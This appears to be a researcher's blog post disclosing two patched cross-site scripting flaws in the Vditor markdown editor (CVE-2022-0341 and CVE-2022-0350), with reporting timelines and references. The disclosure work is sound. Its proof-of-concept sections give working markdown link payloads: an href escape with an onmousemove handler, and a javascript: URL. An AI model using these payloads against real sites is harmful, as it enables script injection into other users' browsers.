---
layout: post
title:  "0-Day, Cross-Site Scripting via markdown syntax (Vditor)"
date:  2022-04-02 12:34:45
description: The article is about 0-day, XSS vulnerability in Vditor. I got two cves as CVE-2022-0341, CVE-2022-0350 for the bugs
---
### Summary

> The vanessa219/vditor is a markdown editor supported by browsers. There were two vulnerabilities.

First vulnerability, When a user creates a link using the markdown syntax, the server does not URL-encode the double-quotes, so the user can escape the href attribute and trigger XSS using the on* attribute. Second vulnerability, If the user passes javascript:alert(document.domain) as the URL value when creating a link using the markdown syntax, there is no sanitizing process and the link is created as it is. Both vulnerabilities were patched in v3.8.13 version, and occur in v3.8.12 v3.8.11.
<br>
- [CVE-2022-0341](#CVE-2022-0341)
    - [Proof of Concept](#Proof-of-Concept-0341)
    - [Reporting Timeline](#Reporting-Timeline-0341)
    - [Reference](#Reference-0341)
- [CVE-2022-0350](#CVE-2022-0350)
    - [Proof of Concept](#Proof-of-Concept-0350)
    - [Reporting Timeline](#Reporting-Timeline-0350)
    - [Reference](#Reference-0350)

---
### CVE-2022-0341
#### Proof of Concept (0341)

```plaintext
XSS PoC : [xss](https://google.com/"//onmousemove="alert(document.domain))
> I can insert an onerror. But I can't log in without a Chinese phone number, so I can't test

1. Open the vanessa219/vditor
2. Enter the XSS PoC (Strangely, it doesn't insert at once, so I have to try inserting several times)
3. When the user hovers the mouse over the link, XSS is triggered via a mouse event.

Video : https://www.youtube.com/watch?v=pKQMbrezdCs
```

---
#### Reporting Timeline (0341)

- 2022-01-23 12h 24m : Reported this issue via the [huntr](https://www.huntr.dev/)
- 2022-01-24 13h 06m : Validated this issue by vanessa219
- 2022-01-24 13h 06m : Assigned a CVE-2022-0341
- 2022-03-14 10h 56m : Patched this issue by vanessa219

---
#### Reference (0341)

- [Github Commit](https://www.github.com/vanessa219/vditor/commit/219f8a9e272aba3cbc0096a82cac776532dbb9e5)
- [Huntr](https://www.huntr.dev/bounties/fa546b57-bc15-4705-824e-9474b616f628/)
- [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0341)
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-0341)
- [Snyk](https://security.snyk.io/vuln/SNYK-JS-VDITOR-2422324)

---
### CVE-2022-0350
#### Proof of Concept (0350)

```plaintext
XSS PoC : [xss](javascript:alert(document.domain))

1. Open the vanessa219/vditor
2. Enter the XSS PoC
3. Click the Link

Video : https://www.youtube.com/watch?v=5zzdiBivNSs
```

---
#### Reporting Timeline (0350)

- 2022-01-24 13h 11m : Reported this issue via the [huntr](https://www.huntr.dev/)
- 2022-01-25 00h 11m : Validated this issue by vanessa219/vditor
- 2022-01-25 00h 11m : Assigned a CVE-2022-0350
- 2022-03-31 22h 57m : Patched this issue by vanessa219


---
#### Reference (0350)

- [Github Commit](https://www.github.com/vanessa219/vditor/commit/e912e36ea98251d700499b1ac7702708d3398476)
- [Huntr](https://www.huntr.dev/bounties/8202aa06-4b49-45ff-aa0f-00982f62005c/)
- [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0350)
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-0350)
- [Snyk](https://security.snyk.io/vuln/SNYK-JS-VDITOR-2438403)

